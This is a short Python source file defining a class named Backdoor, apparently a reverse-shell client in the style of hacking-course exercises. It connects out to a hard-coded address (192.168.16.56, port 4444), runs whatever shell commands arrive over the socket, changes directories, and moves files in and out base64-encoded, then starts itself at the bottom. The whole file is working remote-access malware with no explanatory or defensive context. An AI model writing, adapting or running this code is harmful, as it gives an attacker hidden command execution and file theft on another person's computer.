import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self,ip,port):
        self.con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.con.connect((ip,port))

    def execute_command(self,command):
        return subprocess.check_output(command,shell=True)

    def box_send(self,data):
         json_data = json.dumps(data).encode()
         self.con.send(json_data)

    def change_directory(self,path):
        os.chdir(path)
        return ("[+] change directory to" + path)

    def box_recive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.con.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue    

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read()) 

    def write_file(self,filename,content):
        with open(filename,"wb") as file:
            file.write(base64.b64decode(content)) 
            return "[*] upload succesful"        

    def run(self):
        while True:
            try:
                command = self.box_recive()
                if command[0] =="exit":
                    self.con.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_directory(command[1])

                elif command[0] == "upload":
                    command_result = self.write_file(command[1],command[2])      

                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                else:    
                    command_result = self.execute_command(command).decode()  
            except Exception:
                command_result = "[+] Name Error"
            self.box_send(command_result)

backdoor = Backdoor("192.168.16.56",4444)
backdoor.run()